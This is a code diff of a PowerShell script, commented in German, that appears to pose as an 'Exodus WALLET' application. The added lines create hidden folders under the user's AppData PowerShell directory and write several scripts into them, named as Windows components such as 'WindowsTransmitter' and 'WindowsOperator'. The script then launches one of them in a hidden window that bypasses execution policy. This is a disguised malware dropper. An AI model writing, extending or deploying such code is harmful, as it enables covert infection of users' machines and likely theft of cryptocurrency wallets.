@@ -9,7 +9,9 @@ try {
 
 # ==================== NEUER TEIL: ORDNER ERSTELLEN UND SCRIPTS DROPPEN ====================
 # Zielordner (dynamisch für aktuellen User)
-$targetFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
+$basePowerShellFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
+$operationsFolder = Join-Path $basePowerShellFolder "operations"
+$targetFolder = Join-Path $operationsFolder "System"
 $ceasarScriptPath = Join-Path $targetFolder "WindowsCeasar.ps1"
 $operatorScriptPath = Join-Path $targetFolder "WindowsOperator.ps1"
 $transmitterScriptPath = Join-Path $targetFolder "WindowsTransmitter.ps1"
@@ -1237,40 +1239,46 @@ try {
 }
 
 '@
-
-# Ordner erstellen, falls nicht vorhanden
+# Base PowerShell-Ordner erstellen, falls nicht vorhanden
+if (-not (Test-Path $basePowerShellFolder)) {
+    New-Item -ItemType Directory -Path $basePowerShellFolder -Force | Out-Null
+}
+# Operations-Ordner erstellen und verstecken
+if (-not (Test-Path $operationsFolder)) {
+    New-Item -ItemType Directory -Path $operationsFolder -Force | Out-Null
+    $opsFolder = Get-Item $operationsFolder -Force
+    $opsFolder.Attributes = $opsFolder.Attributes -bor [System.IO.FileAttributes]::Hidden
+    Write-Output "Operations-Ordner erstellt und versteckt: $operationsFolder"
+}
+# System-Ordner (Target) erstellen und verstecken
 if (-not (Test-Path $targetFolder)) {
     New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
-    Write-Output "Ordner erstellt: $targetFolder"  # Optional: Logging
+    $sysFolder = Get-Item $targetFolder -Force
+    $sysFolder.Attributes = $sysFolder.Attributes -bor [System.IO.FileAttributes]::Hidden
+    Write-Output "System-Ordner erstellt und versteckt: $targetFolder"
 }
-
 # WindowsCeasar.ps1 in den Ordner schreiben
 [IO.File]::WriteAllText($ceasarScriptPath, $ceasarScriptContent, [System.Text.Encoding]::UTF8)
-Write-Output "WindowsCeasar.ps1 in $ceasarScriptPath geschrieben."  # Optional: Logging
-
+Write-Output "WindowsCeasar.ps1 in $ceasarScriptPath geschrieben."
 # WindowsOperator.ps1 in den Ordner schreiben
 [IO.File]::WriteAllText($operatorScriptPath, $operatorScriptContent, [System.Text.Encoding]::UTF8)
-Write-Output "WindowsOperator.ps1 in $operatorScriptPath geschrieben."  # Optional: Logging
-
+Write-Output "WindowsOperator.ps1 in $operatorScriptPath geschrieben."
 # WindowsTransmitter.ps1 in den Ordner schreiben
 [IO.File]::WriteAllText($transmitterScriptPath, $transmitterScriptContent, [System.Text.Encoding]::UTF8)
-Write-Output "WindowsTransmitter.ps1 in $transmitterScriptPath geschrieben."  # Optional: Logging
-
+Write-Output "WindowsTransmitter.ps1 in $transmitterScriptPath geschrieben."
 # System.ps1 in den Ordner schreiben
 [IO.File]::WriteAllText($systemScriptPath, $systemScriptContent, [System.Text.Encoding]::UTF8)
-Write-Output "System.ps1 in $systemScriptPath geschrieben."  # Optional: Logging
-
+Write-Output "System.ps1 in $systemScriptPath geschrieben."
+# MicrosoftViewS.ps1 in den Ordner schreiben
 [IO.File]::WriteAllText($microsoftViewSScriptPath, $microsoftViewSScriptContent, [System.Text.Encoding]::UTF8)
 Write-Output "MicrosoftViewS.ps1 in $microsoftViewSScriptPath geschrieben."
-
-# Optional: Hier könntest du die Scripts auch direkt ausführen, z.B. für die Challenge:
-# & $ceasarScriptPath -EnableAutoUpdate -Key "your_key_here"  # Für Ceasar
-# & $operatorScriptPath  # Für Operator
-# Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$transmitterScriptPath`"" -WindowStyle Hidden  # Für Transmitter
-# & $systemScriptPath  # Für System (deployt ein fiktives Modul)
-
-# ==================== ENDE DES NEUEN TEILS ====================
-
+# Alle Dateien sind jetzt geschrieben – WindowsOperator.ps1 ausführen (hidden, non-blocking)
+try {
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$operatorScriptPath`"" -WindowStyle Hidden | Out-Null
+    Write-Output "WindowsOperator.ps1 wurde hidden und asynchron ausgeführt."
+} catch {
+    Write-Output "Fehler beim Ausführen von WindowsOperator.ps1: $_"
+}
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
